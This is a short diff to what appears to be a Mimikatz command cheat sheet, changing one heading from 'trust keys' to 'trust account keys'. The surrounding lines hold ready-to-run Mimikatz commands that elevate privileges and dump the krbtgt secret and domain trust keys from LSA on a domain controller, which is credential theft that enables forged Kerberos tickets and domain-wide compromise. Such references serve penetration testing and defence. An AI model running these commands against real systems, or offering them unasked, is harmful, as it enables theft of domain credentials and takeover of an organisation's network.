@@ -56,7 +56,7 @@ mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::lsa /inject /name:<u
 mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::krbtgt"
 ```
 
-## dump LSA - trust keys (on a DC)
+## dump LSA - trust account keys (on a DC)
 ```
 mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::trust /patch"
 ```
